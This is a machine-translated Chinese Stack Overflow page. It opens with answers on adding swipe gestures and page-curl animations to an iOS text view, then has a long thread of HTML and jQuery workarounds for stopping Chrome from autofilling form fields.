我正在创建在属性列表中有引号的应用程序，当我按下下一个按钮时它会显示在 UIText 中，另一个引号会出现在 textview 中，但是现在我想在用户根据该动作向左或向右滑动引号时添加手势。我是 iphone 新手。我已经使用viewpagger在android中完成了它。任何人都知道这个我怎么能做到..提前谢谢。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-01T06:02:01.600

您可以使用 UISwipeGestureRecognizer 来完成。确保您的 textView 不可编辑。

代码如下：

```
UISwipeGestureRecognizer *leftSwipe = [[UISwipeGestureRecognizer alloc] initWithTarget:self action:@selector(leftSwipe)];
[leftSwipe setDirection:UISwipeGestureRecognizerDirectionLeft];
[_textView addGestureRecognizer:leftSwipe];

UISwipeGestureRecognizer *rightSwipe = [[UISwipeGestureRecognizer alloc] initWithTarget:self action:@selector(rightSwipe)];
[rightSwipe setDirection:UISwipeGestureRecognizerDirectionRight];
[_textView addGestureRecognizer:rightSwipe];

- (void) leftSwipe
{
    NSLog(@"leftSwipe");
}

- (void) rightSwipe
{
    NSLog(@"rightSwipe");
} 
```

现在相应地显示您的报价。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-01T06:41:08.283

为您的报价添加动画：

首先将 QuartzCore 框架导入您的项目。

```
#import <QuartzCore/QuartzCore.h> 
```

现在修改滑动方法如下：

```
- (void) leftSwipe
{
NSLog(@"leftSwipe");

[self curlAnimationFromLeft];
}

- (void) rightSwipe
{
NSLog(@"rightSwipe");

[self curlAnimationFromRight];
}

- (void) curlAnimationFromLeft
{
CATransition *animation = [CATransition animation];
[animation setDelegate:self];
[animation setDuration:1.0];
[animation setTimingFunction:UIViewAnimationCurveEaseInOut];
animation.type = @"pageCurl";
animation.subtype = @"fromRight";
animation.fillMode = kCAFillModeForwards;
[animation setRemovedOnCompletion:YES];
[_textView.layer addAnimation:animation forKey:@"pageCurlAnimation"];
}

-(void)curlAnimationFromRight
{
CATransition *animation = [CATransition animation];
[animation setDelegate:self];
[animation setDuration:1.0];
[animation setTimingFunction:UIViewAnimationCurveEaseInOut];
animation.type = @"pageUnCurl";
animation.subtype = @"fromRight";
animation.fillMode = kCAFillModeForwards;
animation.startProgress = 0.35;
[animation setRemovedOnCompletion:NO];
[_textView.layer addAnimation:animation forKey:@"pageUnCurlAnimation"];
} 
```

# html - 禁用 Chrome 自动填充

> ID：15738259
> 
> 赞同：619
> 
> 时间：2013-04-01T05:45:09.393
> 
> 标签：html, forms, google-chrome, autocomplete, autofill

我在几个表单上遇到了 chrome 自动填充行为的问题。

表单中的字段都有非常常用和准确的名称，例如“email”、“name”或“password”，并且它们也有`autocomplete="off"`设置。

自动完成标志已成功禁用自动完成行为，在您开始输入时会出现下拉值，但并未更改 Chrome 自动填充字段的值。

除了 chrome 错误地填充输入之外，这种行为是可以的，例如用电子邮件地址填充电话输入。客户对此提出了投诉，因此已证实它在多种情况下都会发生，而不是作为我在我的机器上本地完成的某事的某种结果。

我能想到的唯一当前解决方案是动态生成自定义输入名称，然后在后端提取值，但这似乎是解决这个问题的一种非常老套的方法。是否有任何标签或怪癖可以改变可用于解决此问题的自动填充行为？

* * *

## 回答 #1

> 赞同：1160
> 
> 时间：2015-06-22T09:18:01.437

**2021 年 1 月：** `autocomplete="off"`现在可以按预期工作（在 Chrome 88 macOS 上测试）。

为此，请确保您的输入标签包含在表单标签中

* * *

**2020 年 9 月：** `autocomplete="chrome-off"`禁用 Chrome 自动填充功能。

* * *

**原始答案，2015：**

对于新的 Chrome 版本，您只需`autocomplete="new-password"`输入密码字段即可。我已经检查过了，工作正常。

在此讨论中从 Chrome 开发人员那里得到了这个提示： [https ://bugs.chromium.org/p/chromium/issues/detail?id=370363#c7](https://bugs.chromium.org/p/chromium/issues/detail?id=370363#c7)

PS 请注意，Chrome 将尝试从名称、ID 和它可以在字段周围获取的任何文本内容（包括标签和任意文本节点）推断自动填充行为。如果在上下文中存在自动完成标记`street-address`，Chrome 会自动填充它。启发式可能会非常令人困惑，因为它有时只会在表单中有其他字段时触发，或者如果表单中的字段太少则不会触发。另请注意，这`autocomplete="no"`似乎可行，但`autocomplete="off"`由于历史原因不会。`autocomplete="no"`你是在告诉浏览器这个字段应该自动完成为一个名为`"no"`. 如果您生成唯一的随机`autocomplete`名称，则会禁用自动完成。

如果您的用户访问了错误的表单，他们的自动填充信息可能已*损坏*。让他们手动进入并在 Chrome 中修复其自动填充信息可能是他们采取的必要措施。

* * *

## 回答 #2

> 赞同：813
> 
> 时间：2013-04-10T04:54:08.407

我刚刚发现，如果您记住了某个站点的用户名和密码，当前版本的 Chrome 会在任何字段*之前将您的用户名/电子邮件地址自动填充到该字段*`type=password`中。它不关心该字段的名称 - 只是假设密码之前的字段将成为您的用户名。

**旧解决方案**

只需使用`<form autocomplete="off">`它就可以防止密码预填充以及基于浏览器可能做出的假设（通常是错误的）的任何类型的启发式填充字段。与 using `<input autocomplete="off">`which 似乎几乎被密码自动填充忽略（在 Chrome 中，即 Firefox 确实遵守它）相反。

**更新的解决方案**

Chrome 现在忽略`<form autocomplete="off">`. 因此，我最初的解决方法（我已删除）现在风靡一时。

只需创建几个字段并使用“display:none”将它们隐藏起来。例子：

```
<!-- fake fields are a workaround for chrome autofill getting the wrong fields -->
<input style="display: none" type="text" name="fakeusernameremembered" />
<input style="display: none" type="password" name="fakepasswordremembered" /> 
```

然后把你的真实领域放在下面。

请记住添加评论，否则您团队中的其他人会想知道您在做什么！

**2016 年 3 月更新**

刚刚用最新的 Chrome 测试过——一切都很好。这是一个相当老的答案，但我只想提一下，我们的团队多年来一直在数十个项目中使用它。尽管下面有一些评论，它仍然很好用。可访问性没有问题，因为这些字段`display:none`意味着它们没有获得焦点。正如我提到的，您需要将它们放在*您*的真实领域之前。

如果您使用 javascript 来修改表单，则需要一个额外的技巧。在您操作表单时显示假字段，然后在一毫秒后再次隐藏它们。

使用 jQuery 的示例代码（假设你给你的假字段一个类）：

```
$(".fake-autofill-fields").show();
// some DOM manipulation/ajax here
window.setTimeout(function () {
  $(".fake-autofill-fields").hide();
}, 1); 
```

**2018 年 7 月更新**

由于 Chrome 的反可用性专家一直在努力工作，因此我的解决方案不再有效。但是他们以以下形式向我们扔了一块骨头：

```
<input type="password" name="whatever" autocomplete="new-password" /> 
```

这有效并且主要解决了问题。

但是，当您没有密码字段而只有电子邮件地址时，它不起作用。这也很难让它停止变黄和预填充。假字段解决方案可用于解决此问题。

事实上，有时你需要放入两个假字段，并在不同的地方尝试它们。例如，我的表单开头已经有假字段，但 Chrome 最近开始再次预填充我的“电子邮件”字段 - 所以我加倍努力并在“电子邮件”字段之前输入更多假字段，并修复了它. 删除第一批或第二批字段将恢复为不正确的过度自动填充。

**2020 年 3 月更新**

目前尚不清楚该解决方案是否以及何时仍然有效。它有时似乎仍然有效，但并非一直有效。

在下面的评论中，您会发现一些提示。@anilyeni 刚刚添加的一个可能值得更多调查：

*正如我所注意到`autocomplete="off"`的，如果`<form>`. 我不知道逻辑是什么或有关它的相关文档在哪里。*

@dubrox 的这个也可能是相关的，虽然我没有测试过：

*非常感谢这个技巧，但请更新答案，因为`display:none;`它不再起作用了，但是`position: fixed;top:-100px;left:-100px; width:5px;`:)*

**2020 年 4 月更新**

此属性的 chrome 的特殊值正在完成这项工作：（在输入上测试 - 但不是由我测试） `autocomplete="chrome-off"`

* * *

## 回答 #3

> 赞同：289
> 
> 时间：2015-04-11T19:57:47.903

经过几个月和几个月的努力，我发现解决方案比你想象的要简单得多：

而不是`autocomplete="off"`使用**`autocomplete="false"`**;)

就这么简单，它在谷歌浏览器中也像一个魅力！

* * *

**2019 年 8 月更新（评论中感谢 @JonEdiger）**

注意：网上很多信息说浏览器现在将 autocomplete='false' 视为与 autocomplete='off' 相同。至少在这一分钟，它正在阻止这三个浏览器的自动完成。

将其设置在表单级别，然后对于您想要关闭的输入，设置为一些无效值，例如“无”：

```
<form autocomplete="off"> 
  <input type="text" id="lastName" autocomplete="none"/> 
  <input type="text" id="firstName" autocomplete="none"/>
</form> 
```

* * *

## 回答 #4

> 赞同：137
> 
> 时间：2014-11-14T13:32:59.000

有时甚至`autocomplete=off`不会阻止将凭据填写到错误的字段中。

一种解决方法是使用只读模式禁用浏览器自动填充并将焦点设置为可写：

```
 <input type="password" readonly onfocus="this.removeAttribute('readonly');"/> 
```

该`focus`事件发生在鼠标单击和通过字段切换时。

更新：

移动 Safari 将光标设置在字段中，但不显示虚拟键盘。这个新的解决方法像以前一样工作，但处理虚拟键盘：

```
<input id="email" readonly type="email" onfocus="if (this.hasAttribute('readonly')) {
    this.removeAttribute('readonly');
    // fix for mobile safari to show virtual keyboard
    this.blur();    this.focus();  }" /> 
```

现场演示[https://jsfiddle.net/danielsuess/n0scguv6/](https://jsfiddle.net/danielsuess/n0scguv6/)

// 更新结束

**说明：**浏览器自动将凭据填充到错误的文本字段？

> 错误地填写输入，例如用电子邮件地址填写电话输入

有时我会在 Chrome 和 Safari 上注意到这种奇怪的行为，当密码字段以*相同的形式出现时。*我猜，浏览器会寻找密码字段来插入您保存的凭据。然后它将***用户名*****自动填充到最近的 textlike-input 字段中，该字段出现***在 DOM 中的密码字段之前（只是由于观察而猜测）。由于浏览器是最后一个实例，您无法控制它，*

 *上面的这个只读修复对我有用。

* * *

## 回答 #5

> 赞同：95
> 
> 时间：2016-02-25T22:30:01.407

如果您正在实现搜索框功能，请尝试将`type`属性设置`search`为如下：

```
<input type="search" autocomplete="off" /> 
```

这在 Chrome v48 上对我有用，并且似乎是合法的标记：

[https://www.w3.org/wiki/HTML/Elements/input/search](https://www.w3.org/wiki/HTML/Elements/input/search)

* * *

## 回答 #6

> 赞同：77
> 
> 时间：2016-04-12T22:05:49.493

我不知道为什么，但这对我很有帮助。

```
<input type="password" name="pwd" autocomplete="new-password"> 
```

我不知道为什么，但**autocomplete="new-password"**禁用自动填充。它适用于最新的**49.0.2623.112** chrome 版本。

* * *

## 回答 #7

> 赞同：64
> 
> 时间：2014-05-14T05:13:57.343

尝试这个。我知道这个问题有些陈旧，但这是解决问题的另一种方法。

我还注意到这个问题就在这个`password`领域之上。

我尝试了这两种方法

`<form autocomplete="off">`但`<input autocomplete="off">`他们都没有为我工作。

所以我使用下面的代码片段修复了它——只是在密码类型字段上方添加了另一个文本字段并成功了`display:none`。

像这样的东西：

```
<input type="text" name="prevent_autofill" id="prevent_autofill" value="" style="display:none;" />
<input type="password" name="password_fake" id="password_fake" value="" style="display:none;" />
<input type="password" name="password" id="password" value="" /> 
```

希望它会帮助某人。

* * *

## 回答 #8

> 赞同：53
> 
> 时间：2016-09-03T07:00:57.397

对我来说，简单

```
<form autocomplete="off" role="presentation"> 
```

做到了。

在多个版本上测试，最后一次尝试是在 56.0.2924.87

* * *

## 回答 #9

> 赞同：31
> 
> 时间：2016-10-21T14:12:04.010

您必须添加此属性：

```
autocomplete="new-password" 
```

来源链接：[全文](https://developer.mozilla.org/en-US/docs/Web/Security/Securing_your_site/Turning_off_form_autocompletion)

* * *

## 回答 #10

> 赞同：21
> 
> 时间：2016-03-16T08:24:33.853

它是如此简单和棘手:)

谷歌浏览器基本上会搜索,和标签中的**每个可见密码元素**，以便为它们启用自动重新填充，因此要禁用此功能，您需要添加一个虚拟密码元素，如下所示：`<form>``<body>``<iframe>`

1.  *   如果您的密码元素在标签内，您需要在打开标签`<form>`后立即将虚拟元素作为表单中的第一个元素`<form>`

    *   如果您的密码元素不在标签内，则在打开标签`<form>`后立即将虚拟元素作为 html 页面中的第一个元素`<body>`

2.  您需要在不使用 css 的情况下隐藏虚拟元素，`display:none`因此基本上使用以下内容作为虚拟密码元素。

    ```
    <input type="password" style="width: 0;height: 0; visibility: hidden;position:absolute;left:0;top:0;"/> 
    ```

* * *

## 回答 #11

> 赞同：20
> 
> 时间：2015-06-13T22:12:20.183

这是我提出的解决方案，因为谷歌坚持要覆盖人们似乎做出的每一个变通办法。

# 选项 1 - 单击时选择所有文本

将输入的值设置为您的用户的示例（例如`your@email.com`）或字段的标签（例如`Email`），并添加一个调用`focus-select`您的输入的类：

```
<input type="text" name="email" class="focus-select" value="your@email.com">
<input type="password" name="password" class="focus-select" value="password"> 
```

这是jQuery：

```
$(document).on('click', '.focus-select', function(){
  $(this).select();
}); 
```

我真的看不到 Chrome 会弄乱价值观。那太疯狂了。所以希望这是一个安全的解决方案。

# 选项 2 - 将电子邮件值设置为空格，然后将其删除

假设您有两个输入，例如电子邮件和密码，将电子邮件字段的值设置为`" "`（空格）并添加属性/值`autocomplete="off"`，然后使用 JavaScript 清除它。**您可以将密码值留空。**

如果用户由于某种原因没有 JavaScript，请确保您在服务器端修剪他们的输入（您可能无论如何都应该这样做），以防他们不删除空间。

这是jQuery：

```
$(document).ready(function() {
  setTimeout(function(){
    $('[autocomplete=off]').val('');
  }, 15);
}); 
```

我设置了一个超时时间，`15`因为`5`在我的测试中似乎偶尔会起作用，所以将这个数字增加三倍似乎是一个安全的赌注。

未能将初始值设置为空格会导致 Chrome 将输入保留为黄色，就好像它已自动填充一样。

# 选项 3 - 隐藏输入

把它放在表格的开头：

```
<!-- Avoid Chrome autofill -->
<input name="email" class="hide"> 
```

CSS：

```
.hide{ display:none; } 
```

确保保留 HTML 注释，以免其他开发人员将其删除！还要确保隐藏输入的名称是相关的。

* * *

## 回答 #12

> 赞同：20
> 
> 时间：2018-01-16T19:33:57.300

使用 css **text-security: disc**而不使用**type=password**。

html

```
<input type='text' name='user' autocomplete='off' />
<input type='text' name='pass' autocomplete='off' class='secure' />

or

<form autocomplete='off'>
    <input type='text' name='user' />
    <input type='text' name='pass' class='secure' />
</form> 
```

css

```
input.secure {
    text-security: disc;
    -webkit-text-security: disc;
} 
```

* * *

## 回答 #13

> 赞同：16
> 
> 时间：2018-03-01T15:36:48.383

在某些情况下，即使自动完成属性设置为关闭，浏览器也会继续建议自动完成值。这种意想不到的行为可能会让开发人员感到非常困惑。真正强制不自动完成的技巧是**为属性分配一个随机字符串**，例如：

```
autocomplete="nope" 
```

* * *

## 回答 #14

> 赞同：14
> 
> 时间：2015-07-23T19:20:06.367

以前输入的由 chrome 缓存的值显示为下拉选择列表。这可以通过 autocomplete=off 禁用，在 chrome 的高级设置中明确保存的地址会在地址字段获得焦点时提供自动填充弹出窗口。这可以通过 autocomplete="false" 禁用.但是它将允许chrome在下拉列表中显示缓存的值。

在输入 html 字段上，以下将关闭两者。

`Role="presentation" & autocomplete="off"`

在为地址自动填充选择输入字段时，Chrome 会忽略那些没有前面标签 html 元素的输入字段。

为了确保 chrome 解析器忽略自动填充地址弹出的输入字段，可以在标签和文本框之间添加隐藏按钮或图像控件。这将破坏自动填充的标签输入对创建的 chrome 解析序列。解析地址字段时忽略复选框

Chrome 还考虑标签元素上的“for”属性。它可以用来打破 chrome 的解析序列。

* * *

## 回答 #15

> 赞同：13
> 
> 时间：2015-11-17T20:41:35.323

我发现将此添加到表单会阻止 Chrome 使用自动填充。

```
<div style="display: none;">
    <input type="text" id="PreventChromeAutocomplete" name="PreventChromeAutocomplete" autocomplete="address-level4" />
</div> 
```

在这里找到。[https://code.google.com/p/chromium/issues/detail?id=468153#hc41](https://code.google.com/p/chromium/issues/detail?id=468153#hc41)

真正令人失望的是，Chrome 决定它比开发人员更了解何时自动完成。有一种真正的微软感觉。

* * *

## 回答 #16

> 赞同：12
> 
> 时间：2016-08-18T08:00:56.657

```
<input readonly onfocus="this.removeAttribute('readonly');" type="text"> 
```

将 readonly 属性添加到标签以及 onfocus 事件删除它修复了问题

* * *

## 回答 #17

> 赞同：9
> 
> 时间：2015-03-20T03:14:58.427

对于用户名密码组合，这是一个容易解决的问题。Chrome 启发式查找模式：

```
<input type="text"> 
```

其次是：

```
<input type="password"> 
```

简单地通过使这个无效来打破这个过程：

```
<input type="text">
<input type="text" onfocus="this.type='password'"> 
```

* * *

## 回答 #18

> 赞同：8
> 
> 时间：2018-05-31T10:06:53.627

2016 年，Google Chrome 开始忽略`autocomplete=off`它，尽管它在 W3C 中。[他们发布的答案](https://bugs.chromium.org/p/chromium/issues/detail?id=468153#c164)：

> 这里棘手的部分是，在网络之旅的某个地方 autocomplete=off 成为许多表单字段的默认设置，而没有真正考虑过这是否对用户有利。这并不意味着不存在您不希望浏览器自动填充数据的非常有效的情况（例如在 CRM 系统上），但总的来说，我们将这些情况视为少数情况。因此，我们开始忽略 Chrome 自动填充数据的 autocomplete=off。

这实质上是说：我们更了解用户想要什么。

[当需要 autocomplete=off 时，他们打开了另一个错误以发布有效用例](https://bugs.chromium.org/p/chromium/issues/detail?id=587466)

在我的所有 B2B 应用程序中，我没有看到与自动完成有关的问题，但只有输入密码类型。

如果屏幕上有任何密码字段，即使是隐藏的，自动填充也会介入。要打破这个逻辑，如果它不破坏你自己的页面逻辑，你可以将每个密码字段放入它自己的表单中。

```
<input type=name >

<form>
    <input type=password >
</form> 
```

* * *

## 回答 #19

> 赞同：8
> 
> 时间：2016-05-31T15:20:34.487

Mike Nelsons 提供的解决方案在 Chrome 50.0.2661.102 m 中对我不起作用。只需添加具有 display:none 设置的相同类型的输入元素不再禁用本机浏览器自动完成。现在需要复制您希望禁用自动完成的输入字段的名称属性。

此外，为避免输入字段在表单元素中时重复，您应该在未显示的元素上放置禁用。这将阻止该元素作为表单操作的一部分提交。

```
<input name="dpart" disabled="disabled" type="password" style="display:none;">
<input name="dpart" type="password">
<input type="submit"> 
```

* * *

## 回答 #20

> 赞同：7
> 
> 时间：2015-03-18T18:28:21.730

如果您在保留占位符但禁用 chrome 自动填充时遇到问题，我发现了这个解决方法。

**问题**

HTML

```
<div class="form">
    <input type="text" placeholder="name"><br>
    <input type="text" placeholder="email"><br>
    <input type="text" placeholder="street"><br>
</div> 
```

[http://jsfiddle.net/xmbvwfs6/1/](http://jsfiddle.net/xmbvwfs6/1/)

上面的示例仍然会产生自动填充问题，但如果您使用`required="required"`和一些 CSS，您可以复制占位符，Chrome 不会拾取标签。

**解决方案**

HTML

```
<div class="form">
    <input type="text" required="required">
    <label>Name</label>  
    <br>
    <input type="text" required="required">
    <label>Email</label>    
    <br>
    <input type="text" required="required">
    <label>Street</label>    
    <br>
</div> 
```

CSS

```
input {
    margin-bottom: 10px;
    width: 200px;
    height: 20px;
    padding: 0 10px;
    font-size: 14px;
}
input + label {
    position: relative;
    left: -216px;
    color: #999;
    font-size: 14px;
}
input:invalid + label { 
    display: inline-block; 
}
input:valid + label { 
    display: none; 
} 
```

[http://jsfiddle.net/mwshpx1o/1/](http://jsfiddle.net/mwshpx1o/1/)

* * *

## 回答 #21

> 赞同：7
> 
> 时间：2014-07-24T19:56:51.303

这有两个部分。Chrome 和其他浏览器会记住以前输入的字段名称值，并基于此向用户提供一个自动完成列表（值得注意的是，密码类型输入*永远不会*以这种方式记住，原因很明显）。您可以在电子邮件字段等内容上添加`autocomplete="off"`以防止这种情况发生。

但是，您将拥有密码填充器。大多数浏览器都有自己的内置实现，并且还有许多提供此功能的第三方实用程序。这，你停*不下来。*这是用户自行选择保存此信息以供以后自动填写，完全超出您的应用程序的范围和影响范围。

* * *

## 回答 #22

> 赞同：7
> 
> 时间：2015-03-18T19:24:20.417

*我真的不喜欢制作隐藏字段，我认为这样做会很快变得非常混乱。*

在您要停止自动完成的输入字段上，这将起作用。使字段只读并在焦点上删除该属性，如下所示

```
<input readonly onfocus="this.removeAttribute('readonly');" type="text"> 
```

这样做是您首先必须通过选择该字段来删除**只读属性**，那时您很可能将填充您自己的用户输入并弯腰**自动填充**以接管

* * *

## 回答 #23

> 赞同：7
> 
> 时间：2017-10-22T12:27:50.100

好吧，既然我们都有这个问题，我花了一些时间来为这个问题编写一个有效的 jQuery 扩展。**谷歌必须遵循 html 标记，而不是我们遵循谷歌**

```
(function ($) {

"use strict";

$.fn.autoCompleteFix = function(opt) {
    var ro = 'readonly', settings = $.extend({
        attribute : 'autocomplete',
        trigger : {
            disable : ["off"],
            enable : ["on"]
        },
        focus : function() {
            $(this).removeAttr(ro);
        },
        force : false
    }, opt);

    $(this).each(function(i, el) {
        el = $(el);

        if(el.is('form')) {
            var force = (-1 !== $.inArray(el.attr(settings.attribute), settings.trigger.disable))
            el.find('input').autoCompleteFix({force:force});
        } else {
            var disabled = -1 !== $.inArray(el.attr(settings.attribute), settings.trigger.disable);
            var enabled = -1 !== $.inArray(el.attr(settings.attribute), settings.trigger.enable);
            if (settings.force && !enabled || disabled)
                el.attr(ro, ro).focus(settings.focus).val("");
        }
    });
};
})(jQuery); 
```

只需将其添加到**/js/jquery.extends.js**之类的文件中，然后将其包含在 jQuery 中。在加载文档时将其应用于每个表单元素，如下所示：

```
$(function() {
    $('form').autoCompleteFix();
}); 
```

[jsfiddle与测试](http:////jsfiddle.net/magicsux/x2k7xpuv/embed/js,html,css,result/dark/)

* * *

## 回答 #24

> 赞同：6
> 
> 时间：2014-03-20T09:20:58.753

试试下面`jQuery`对我有用的代码。

```
if ($.browser.webkit) {
    $('input[name="password"]').attr('autocomplete', 'off');
    $('input[name="email"]').attr('autocomplete', 'off');
} 
```

* * *

## 回答 #25

> 赞同：6
> 
> 时间：2015-02-26T17:26:51.167

这是一个肮脏的黑客 -

你在这里有你的元素（添加 disabled 属性）：

```
<input type="text" name="test" id="test" disabled="disabled" /> 
```

然后在你的网页底部放一些 JavaScript：

```
<script>
    setTimeout(function(){
        document.getElementById('test').removeAttribute("disabled");
        },100);
</script> 
```

* * *

## 回答 #26

> 赞同：6
> 
> 时间：2016-02-12T16:11:37.277

不同的解决方案，基于 webkit。如前所述，只要 Chrome 找到密码字段，它就会自动完成电子邮件。AFAIK，这与 autocomplete = [whatever] 无关。

为了规避这种情况，请将输入类型更改为文本并以您想要的任何形式应用 webkit 安全字体。

```
.secure-font{
-webkit-text-security:disc;}

<input type ="text" class="secure-font"> 
```

据我所知，这至少与输入类型 = 密码一样安全，它是复制和粘贴安全的。但是，通过删除将删除星号的样式很容易受到攻击，当然 input type = password 可以很容易地在控制台中更改为 input type = text 以显示任何自动填充的密码，因此实际上几乎相同。

* * *

## 回答 #27

> 赞同：6
> 
> 时间：2018-05-21T03:01:44.833

我终于使用`textarea`. 对于密码字段，有一个事件处理程序将输入的每个字符替换为“•”。

* * *

## 回答 #28

> 赞同：6
> 
> 时间：2016-01-15T11:01:53.157

根据[Chromium 错误报告 #352347](https://code.google.com/p/chromium/issues/detail?id=352347) Chrome 不再尊重`autocomplete="off|false|anythingelse"`，无论是表单还是输入。

对我有用的唯一解决方案是**添加一个虚拟密码字段**：

```
<input type="password" class="hidden" />
<input type="password" /> 
```

* * *

## 回答 #29

> 赞同：6
> 
> 时间：2015-12-17T06:24:52.440

通过设置`autocomplete`应该`off`在这里工作，我有一个谷歌在搜索页面中使用的例子。我从检查元素中找到了这个。

[![在此处输入图像描述](https://i.stack.imgur.com/NLvNh.png)](https://i.stack.imgur.com/NLvNh.png)

**编辑**：如果`off`不起作用，请尝试`false`或`nofill`. 就我而言，它正在使用 chrome 版本 48.0

* * *

## 回答 #30

> 赞同：4
> 
> 时间：2016-07-16T00:42:50.233

添加到密码字段的最新解决方案`autocomplete="new-password"`非常适合防止 Chrome 自动填充它。

但是，正如 sibbl 指出的那样，这并不能阻止 Chrome 在表单提交完成后要求您保存密码。从 Chrome 51.0.2704.106 开始，我发现您可以通过添加一个也具有属性的不可见虚拟密码字段来完成此操作`autocomplete="new-password"`。请注意，“display:none”在这种情况下不起作用。例如，在真实密码字段之前添加类似这样的内容：

```
<input type="password" autocomplete="new-password" 
style="visibility:hidden;height:0;width:1px;position:absolute;left:0;top:0">` 
```

这仅在我将宽度设置为非零值时才对我有用。感谢 tibalt 和 fareed namrouti 的原始答案。

* * *

## 回答 #31

> 赞同：4
> 
> 时间：2015-09-15T08:18:50.303

我遇到了同样的问题。这是在 Chrome 上禁用自动填充用户名和密码的解决方案（仅在 Chrome 上测试过）

```
 <!-- Just add this hidden field before password as a charmed solution to prevent auto-fill of browser on remembered password -->
    <input type="tel" hidden />
    <input type="password" ng-minlength="8" ng-maxlength="30" ng-model="user.password" name="password" class="form-control" required placeholder="Input password"> 
```

* * *

## 回答 #32

> 赞同：3
> 
> 时间：2014-05-14T18:51:57.547

对我有用的唯一方法是：（需要jQuery）

```
$(document).ready(function(e) {
    if ($.browser.webkit) {
        $('#input_id').val(' ').val('');
    }
}); 
```

* * *

## 回答 #33

> 赞同：3
> 
> 时间：2016-10-13T23:05:04.410

尝试在值中留一个空格：

```
<input type="email" name="email" value="&nbsp;">
<input type="password" name="password" value="&nbsp;"> 
```

铬 54.0.2840.59

* * *

## 回答 #34

> 赞同：3
> 
> 时间：2018-05-01T19:31:51.520

我的解决方法，因为上述方法似乎都不适用于 Chrome 63 及更高版本

我通过将有问题的输入元素替换为

```
<p class="input" contenteditable="true">&nbsp;</p> 
```

并在提交之前使用 jQuery 填充隐藏字段。

但由于 Chromium 的一个错误决定，这是一个真正可怕的黑客行为。

* * *

## 回答 #35

> 赞同：2
> 
> 时间：2015-03-30T03:05:24.727

最后，我认为我提出了一个不错的解决方案。更好地了解下拉菜单如何与 Chrome 一起使用有助于 :) 基本上，当您聚焦输入时，当您输入与 Chrome 内存中的内容匹配的条目时，当您生成鼠标按下事件时，将显示下拉菜单。请记住这一点，并且 Chrome 会在某些输入具有默认名称（例如“名称”、“电子邮件”等）时执行此操作。然后我们只需要在要显示下拉列表时删除名称并在之后将其添加回来:) 我想使用一个解决方案，它可以通过添加属性自动完成来使其工作。我认为这是有道理的。这是代码：

**解决方案 1**

```
jQuery('body').on('mousedown','[name="name"][autocomplete="off"], [name="email"][autocomplete="off"]',function(e){
    e.stopImmediatePropagation();
    if(typeof this.currentName =="undefined")
        this.currentName=jQuery(this).attr('name');
    jQuery(this).attr('name','');
});

jQuery('body').on('blur','[autocomplete="off"]',function(e){
    e.stopImmediatePropagation();
    jQuery(this).attr('name',this.currentName);
}); 
```

**解决方案2（我最喜欢的一个）**

我上面描述的解决方案将删除输入的名称，直到我们删除焦点（模糊），在那一刻它会放回原来的名称。但是可能会发生我们有兴趣在输入时通过其名称属性访问输入。这意味着我们需要在每次输入后立即放回名称。这个解决方案，基本上是基于第一个解决方案。在这种情况下，我们将在 key down 上添加名称，并将其放回 keyup。我认为这更适合与“自动完成关闭”行为的兼容性。无论如何，这是代码：

```
jQuery('body').on('mousedown keydown','[name="name"][autocomplete="off"], [name="email"][autocomplete="off"]',function(e){
    e.stopImmediatePropagation();
    if(typeof this.currentName =="undefined")
        this.currentName=jQuery(this).attr('name');
    jQuery(this).attr('name','');
});
jQuery('body').on('blur keyup','[autocomplete="off"]',function(e){
    e.stopImmediatePropagation();
    if(typeof this.currentName !="undefined")
        jQuery(this).attr('name',this.currentName);
}); 
```

> 请注意，对于解决方案 1 和 2，我仅采用了输入名称为“名称”和“电子邮件”的情况。对于此属性使 Chrome 生成下拉列表的任何其他情况，您必须将其添加到鼠标按下事件的选择器中。

**解决方案 3**

这个解决方案更加混乱。我没有意识到我们试图纠正的行为只是基于那些具有特定名称的输入，如“姓名、电子邮件等”。该解决方案的方法是针对 Chrome 显示我们事先不知道的其他名称的情况。这将是一个非常通用的解决方案。我不像其他两个那样喜欢，主要是因为当我们按下删除键时可能会有一个小的闪烁。我将在下面解释。

我发现第二次单击输入后会出现下拉菜单，但当您第一次将注意力集中在输入上时，不会出现在第一次单击时。我为所有这些元素绑定了一个“mousedown”事件，其中处理程序基本上检测它是否已经集中在输入上，如果它检测到另一个“mouse down”，则强制 .blur() 然后 .focus() 之后，防止聚焦后第二次单击的下拉菜单。我希望很清楚，以防万一这是我使用的代码：

```
jQuery('body').on('mousedown','[autocomplete="off"]',function(e){
    e.stopImmediatePropagation();
    if(jQuery(this).is(':focus')) {
        jQuery(this).blur();
        jQuery(this).focus();
    }
}); 
```

另一方面，为了防止您在输入时出现下拉菜单，以防它与 Chrome 建议匹配……这有点棘手。我只是决定在用户​​键入时替换输入的默认行为。下拉列表评估鼠标按下时的输入，因此我阻止了字母数字、空格等的默认行为。唯一的问题是命令、Ctrl 和删除。对于这种情况，我还必须在鼠标上绑定一个事件。它允许前两种情况下的默认行为，因此您可以进行复制、粘贴或全选。在删除的情况下，我必须允许默认行为，但如果在删除字符后输入与 Chrome 建议匹配，那么它再次显示下拉菜单。对于这种情况，我不得不使用相同的模糊和聚焦技巧。我发现的唯一不便之处是，由于我们取消了 keyup 上的行为，并且 chrome 尝试在 keydown 上显示它，所以会有一点闪烁。无论如何，这是我能做的最好的了。可能需要在某一时刻过滤字符。我只是添加了现在更有意义的条件。这是代码的第二部分：

```
jQuery('body').on('keydown','[autocomplete="off"]',function(e){
    e.stopImmediatePropagation();
    var ctrlKey = 17,cmKey = 91;
    var charCode = e.which || e.keyCode;

    if(charCode!=16 && this.commandDown != true && this.ctrlDown != true && ((charCode>47 && charCode<58)||(charCode>64 && charCode<91)||(charCode>96 && charCode<123)||charCode==0 || charCode==32)){ 
        e.preventDefault();
        var charStr = String.fromCharCode(charCode);
        if(!e.shiftKey)
            charStr = charStr.toLowerCase(charStr);
        $(this).val($(this).val() + charStr);
    }else{
        if (charCode == cmKey) this.commandDown = true;
        if (charCode == ctrlKey) this.ctrlDown = true;
    }
});
jQuery('body').on('keyup','[autocomplete="off"]',function(e){
    e.stopImmediatePropagation();
    var allowed=[8];//Delete
    var ctrlKey = 17,cmKey = 91;
    var charCode = e.which || e.keyCode;

    if (charCode == cmKey) {this.commandDown = false};
    if (charCode == ctrlKey) {this.ctrlDown = false};
    if(allowed.indexOf(charCode)>=0 || (this.commandDown!=false && this.ctrlDown!=false)){
        jQuery(this).blur();
        jQuery(this).focus();
} 
```

正如我所说，这个解决方案更加混乱。这是我使用的第一个，直到我意识到某些输入名称才出现下拉列表。

